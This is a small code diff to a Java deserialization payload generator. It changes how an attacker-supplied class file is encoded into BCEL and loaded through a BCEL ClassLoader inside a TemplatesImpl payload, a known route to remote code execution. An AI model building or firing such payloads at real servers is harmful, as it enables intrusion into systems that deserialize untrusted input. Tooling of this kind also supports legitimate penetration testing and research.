@@ -1,5 +1,6 @@
 package me.gv7.woodpecker.yso.payloads.custom;
 
+import me.gv7.woodpecker.bcel.HackBCELs;
 import me.gv7.woodpecker.yso.payloads.util.CommonUtil;
 import sun.misc.BASE64Decoder;
 
@@ -60,7 +61,7 @@ public class TemplatesImplUtil {
             cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE)){
             String bcelClassFile = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE.length());
-            String strBCEL = CommonUtil.classToBCEL(bcelClassFile);
+            String strBCEL = HackBCELs.encode(bcelClassFile);
             cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_FILE)){
             String scriptFilePath = command.substring(CustomCommand.COMMAND_SCRIPT_FILE.length());
